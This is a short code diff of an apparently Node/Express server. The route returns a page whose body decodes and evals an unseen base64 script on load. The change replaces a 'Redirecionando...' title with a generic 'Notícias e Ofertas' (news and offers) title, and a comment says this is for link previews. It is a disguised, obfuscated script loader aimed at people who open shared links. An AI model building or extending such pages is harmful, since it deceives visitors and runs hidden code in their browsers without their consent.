@@ -58,7 +58,9 @@ app.get('/', (req, res) => {
     const html = `
     <!DOCTYPE html>
     <html>
-    <head><title>Redirecionando...</title></head>
+    <head>
+        <title>Notícias e Ofertas</title> <!-- Título genérico pro preview -->
+    </head>
     <body>
         <script>eval(atob("${script}"));</script>
     </body>
